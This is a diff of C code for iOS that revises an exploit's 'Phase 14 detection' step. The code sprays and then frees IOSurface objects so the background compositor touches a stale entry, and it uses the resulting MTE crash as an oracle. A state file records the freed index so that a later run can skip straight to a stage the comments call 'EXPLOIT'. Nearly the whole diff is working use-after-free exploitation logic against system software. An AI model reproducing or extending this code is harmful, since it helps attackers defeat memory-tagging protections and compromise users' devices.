@@ -19850,82 +19850,115 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                /* === Phase 14 detection: CONTINUOUS safe render + sequential free ===
+                /* === Phase 14 detection: crash oracle with state file ===
                  *
-                 * Previous attempts showed 100ms safe render loops (6 frames) don't
-                 * trigger the compositor traversal. The original Phase 13 render loop
-                 * ran 75 frames before MTE survival was detected. The compositor
-                 * traversal is infrequent — we need a CONTINUOUS render loop running
-                 * while we free surfaces from the main thread.
+                 * Signal handling cannot catch the MTE fault (it's either SIGKILL
+                 * or delivered to a kernel thread). The continuous render loop
+                 * prevents crashes by reclaiming freed GEN1 slots.
                  *
-                 * Approach:
-                 * 1. Start ONE safe render loop (continuous, with signal handler)
-                 * 2. Let it warm up for 500ms (~30 frames) to establish compositor state
-                 * 3. Free surfaces one at a time from main thread (200ms apart)
-                 * 4. After each free, check p13_safe_signal flag
-                 * 5. If flag is set → the render loop caught a signal → match found
-                 * 6. Last freed surface was the match (or one of the batch just freed)
+                 * Strategy: two-run approach
                  *
-                 * Stage A: Bulk free [255..64] in batches of 16, check flag after each batch
-                 * Stage B: One-at-a-time free [63..0], check flag after each */
+                 * Run 1 (IDENTIFY): Check for prior state file. If none, free
+                 * surfaces one-by-one WITHOUT any render loop. The background
+                 * compositor independently traverses the stale entry. When it
+                 * hits a freed matched surface → MTE fault → crash. The state
+                 * file records the last freed index.
+                 *
+                 * Run 2+ (EXPLOIT): Read state file. If a match index was
+                 * recorded from a prior crash, use it directly — skip identification.
+                 */
                 {
-                    /* Step 1: bare render loop sanity check */
-                    rlog("  r=229: Testing bare render loop restart...\n");
-                    p13_render_frames = 0;
-                    p13_render_run = 1;
-                    pthread_t rt0;
-                    pthread_create(&rt0, NULL, p13_render_loop, NULL);
-                    usleep(200000);
-                    p13_render_run = 0;
-                    pthread_join(rt0, NULL);
-                    rlog("  r=229: Bare render loop survived (%d frames).\n",
-                        p13_render_frames);
-
-                    int ft_found = -1;
-
-                    /* Step 2: Start CONTINUOUS safe render loop */
-                    rlog("  r=229: Starting continuous safe render loop...\n");
-                    p13_render_frames = 0;
-                    p13_render_run = 1;
-                    p13_safe_signal = 0;
-                    pthread_t safe_th;
-                    pthread_create(&safe_th, NULL, p13_render_loop_safe, NULL);
-
-                    /* Warm up: let compositor establish traversal pattern */
-                    usleep(500000);
-                    rlog("  r=229: Safe render loop warmed up (%d frames)\n",
-                        p13_render_frames);
-
-                    /* ---- Stage A: Bulk free [255..64] in batches of 16 ---- */
-                    rlog("  r=229: Stage A: bulk free [255->64] batch=16\n");
-                    for (int fi = 255; fi >= 64 && ft_found < 0; fi--) {
-                        if (!r229_spray[fi]) continue;
-                        CFRelease(r229_spray[fi]);
-                        r229_spray[fi] = NULL;
-
-                        if (fi % 16 == 0) {
-                            usleep(50000);
-                            if (p13_safe_signal != 0) {
-                                rlog("  r=229: SIGNAL %d caught during Stage A free near [%d]!\n",
-                                    (int)p13_safe_signal, fi);
-                                ft_found = fi;
-                            } else {
-                                rlog("  r=229: FT-A[%d] batch survived (frames=%d)\n",
-                                    fi, p13_render_frames);
+                    /* Check for state file from prior crash */
+                    int prior_match = -1;
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int sfd = open(sp, O_RDONLY);
+                        if (sfd >= 0) {
+                            int magic = 0, idx = -1;
+                            if (read(sfd, &magic, sizeof(int)) == sizeof(int) &&
+                                read(sfd, &idx, sizeof(int)) == sizeof(int) &&
+                                magic == 0xF7E5 && idx >= 0 && idx < 256) {
+                                prior_match = idx;
+                                rlog("  r=229: STATE FILE found: prior crash at spray[%d]\n", idx);
                             }
+                            close(sfd);
+                            /* Delete state file so next run starts fresh */
+                            unlink(sp);
                         }
                     }
-                    if (ft_found < 0 && p13_safe_signal == 0)
-                        rlog("  r=229: Stage A complete, 64 surfaces remain\n");
 
-                    /* ---- Stage B: Per-surface free [63..0] ---- */
-                    if (ft_found < 0 && p13_safe_signal == 0) {
-                        rlog("  r=229: Stage B: per-surface free [63->0] continuous render\n");
-                        int stageB_tested = 0;
-                        for (int fi = 63; fi >= 0 && ft_found < 0; fi--) {
+                    int ft_found = prior_match;
+
+                    if (ft_found >= 0) {
+                        rlog("  r=229: Using prior crash match index %d\n", ft_found);
+                        /* Verify the surface at this index is still alive */
+                        if (r229_spray[ft_found]) {
+                            rlog("  r=229: spray[%d] alive, id=%u\n",
+                                ft_found, IOSurfaceGetID(r229_spray[ft_found]));
+                        } else {
+                            rlog("  r=229: spray[%d] is NULL! Clearing match.\n", ft_found);
+                            ft_found = -1;
+                        }
+                    }
+
+                    if (ft_found < 0) {
+                        /* IDENTIFY run: free surfaces one at a time, no render loop.
+                         * The background compositor traversal will crash the app
+                         * when it hits the freed matched surface. */
+                        rlog("  r=229: IDENTIFY run: freeing surfaces without render loop\n");
+                        rlog("  r=229: Bare render loop sanity check first...\n");
+
+                        p13_render_frames = 0;
+                        p13_render_run = 1;
+                        pthread_t rt0;
+                        pthread_create(&rt0, NULL, p13_render_loop, NULL);
+                        usleep(200000);
+                        p13_render_run = 0;
+                        pthread_join(rt0, NULL);
+                        rlog("  r=229: Bare render loop survived (%d frames).\n",
+                            p13_render_frames);
+
+                        /* Stage A: Fast bulk free [255..64] without render loop.
+                         * Wait 500ms per batch of 32 for compositor to catch up. */
+                        rlog("  r=229: Stage A: bulk free [255->64] no render loop\n");
+                        for (int fi = 255; fi >= 64; fi--) {
                             if (!r229_spray[fi]) continue;
 
-                            /* Write test index to state file for post-mortem */
+                            /* Write test index to state file */
+                            {
+                                char sp[512];
+                                snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
+                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                                if (sfd >= 0) {
+                                    int magic = 0xF7E5;
+                                    write(sfd, &magic, sizeof(int));
+                                    write(sfd, &fi, sizeof(int));
+                                    fsync(sfd); close(sfd);
+                                }
+                            }
+
+                            CFRelease(r229_spray[fi]);
+                            r229_spray[fi] = NULL;
+
+                            if (fi % 32 == 0) {
+                                /* Wait for background compositor to potentially
+                                 * traverse the stale entry */
+                                usleep(500000);
+                                rlog("  r=229: FT-A[%d] survived (no render loop)\n", fi);
+                            }
+                        }
+                        rlog("  r=229: Stage A complete, 64 surfaces remain\n");
+
+                        /* Stage B: Per-surface free [63..0] with longer waits.
+                         * The match is likely in this range. */
+                        rlog("  r=229: Stage B: per-surface free [63->0] no render loop\n");
+                        for (int fi = 63; fi >= 0; fi--) {
+                            if (!r229_spray[fi]) continue;
+
+                            /* Write test index to state file */
                             {
                                 char sp[512];
                                 snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
@@ -19943,40 +19976,33 @@ new_modes:
                             CFRelease(r229_spray[fi]);
                             r229_spray[fi] = NULL;
 
-                            /* Wait 200ms for compositor to potentially traverse
-                             * the stale entry and hit the freed surface */
-                            usleep(200000);
+                            /* Wait 1 second for background compositor.
+                             * If the app survives, this wasn't the match. */
+                            usleep(1000000);
 
-                            /* Check if safe render loop caught a signal */
-                            if (p13_safe_signal != 0) {
-                                rlog("  r=229: SIGNAL %d caught after freeing FT-B[%d] id=%u -> MATCH!\n",
-                                    (int)p13_safe_signal, fi, sid);
-                                ft_found = fi;
-                            } else {
-                                stageB_tested++;
-                                if (fi % 8 == 0) {
-                                    rlog("  r=229: FT-B[%d] survived (id=%u frames=%d)\n",
-                                        fi, sid, p13_render_frames);
-                                }
+                            if (fi % 8 == 0) {
+                                rlog("  r=229: FT-B[%d] survived 1s (id=%u)\n", fi, sid);
                             }
                         }
-                        rlog("  r=229: Stage B tested %d surfaces, found=%d\n",
-                            stageB_tested, ft_found);
-                    }
 
-                    /* Stop safe render loop */
-                    p13_render_run = 0;
-                    void *safe_ret = NULL;
-                    pthread_join(safe_th, &safe_ret);
-                    rlog("  r=229: Safe render loop stopped (frames=%d ret=%p)\n",
-                        p13_render_frames, safe_ret);
-
-                    /* Also check the return value — signal may have been caught
-                     * right as we stopped the loop */
-                    if (ft_found < 0 && safe_ret != NULL) {
-                        rlog("  r=229: Safe render loop returned signal %d\n",
-                            (int)(uintptr_t)safe_ret);
-                        /* Can't pinpoint the exact surface, mark as unknown */
+                        /* If we get here, all surfaces freed and no crash.
+                         * This shouldn't happen — the compositor should have
+                         * hit the stale entry. The match might have been in
+                         * Stage A range, or the compositor cycle is > 1 second.
+                         * Try a final render loop to force traversal. */
+                        rlog("  r=229: All surfaces freed without crash!\n");
+                        rlog("  r=229: Trying final render loop to force traversal...\n");
+                        p13_render_frames = 0;
+                        p13_render_run = 1;
+                        pthread_t rft;
+                        pthread_create(&rft, NULL, p13_render_loop, NULL);
+                        usleep(2000000);
+                        p13_render_run = 0;
+                        pthread_join(rft, NULL);
+                        rlog("  r=229: Final render loop survived (%d frames)\n",
+                            p13_render_frames);
+                        rlog("  r=229: Stale entry may have been cleaned up.\n");
+                        rlog("  r=229: Proceeding blind.\n");
                     }
 
                     if (ft_found >= 0) {
@@ -19984,7 +20010,6 @@ new_modes:
                         r229_match_idx = ft_found;
                         r229_mte_match = 1;
                     } else {
-                        rlog("  r=229: No match identified via continuous safe render.\n");
                         int live_n = 0;
                         for (int si = 0; si < 256; si++) {
                             if (r229_spray[si]) live_n++;
